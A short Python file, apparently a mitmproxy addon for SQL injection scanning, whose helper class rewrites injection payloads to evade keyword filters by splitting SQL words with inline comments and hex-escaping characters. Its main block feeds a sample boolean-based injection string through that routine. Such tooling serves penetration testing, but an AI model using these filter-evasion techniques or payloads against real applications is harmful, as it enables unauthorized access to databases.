# -*-coding:utf-8 -*-
# version: python3.8.6
# author: clay_nu
# datetime: 2023/2/1 14:18
import json
import re
import string

import mitmproxy.http
import requests
from colorama import init

init(autoreset=False)


def printf(log, type=1):
    print(f'\033[3{type}m{log}\033[0m')


class ithr_filters:
    def __init__(self, filter=['union']):
        self.filter = filter    # 关键词列表 AND => AN/* */D  OR -> O/* */R
        self.chars = r'\)|='    # 需要16进制编码的特殊字符
        self.match_filter = ''  # 正则sub匹配的关键词
        self.reload_filter()

    def reload_filter(self) -> None:
        self.match_filter = f'({"|".join(self.filter)})'

    def append(self, keyword) -> None:
        self.filter.append(keyword)
        self.reload_filter()

    def get_filter(self) -> str:
        return self.match_filter

    def annotation_escape(self, payload: re.Match):
        payload = payload[0]
        payload = f'{payload[0:-1]}/* */{payload[-1:]}'
        return payload


    def hex_escape(self,payload: re.Match):
        payload = payload[0]
        payload = r"""\x"""+payload.encode().hex()
        return payload

    def match(self, payload) -> str:
        payload_hex_escape = re.sub(self.chars, self.hex_escape, payload)
        payload_escape = re.sub(self.match_filter, self.annotation_escape, payload_hex_escape)
        return payload_escape



class dec_proxy:
    def __init__(self):
        printf("sql扫描异常响应处理代理", 2)
        self.filters = ithr_filters()

    def request(self, flow: mitmproxy.http.HTTPFlow):
        req = flow.request
        data = req.json()
        filed = data['filters']
        data['filters'] = [filed]


addons = [dec_proxy()]

if __name__ == '__main__':
    filters = ithr_filters(filter=['union', 'and', 'AND', 'LIKE', 'UNION', 'OR', 'NOT'])
    payload = "1=1'))) OR NOT 9459=9459 AND ((('Vkld'='Vkld"
    print(filters.match(payload))
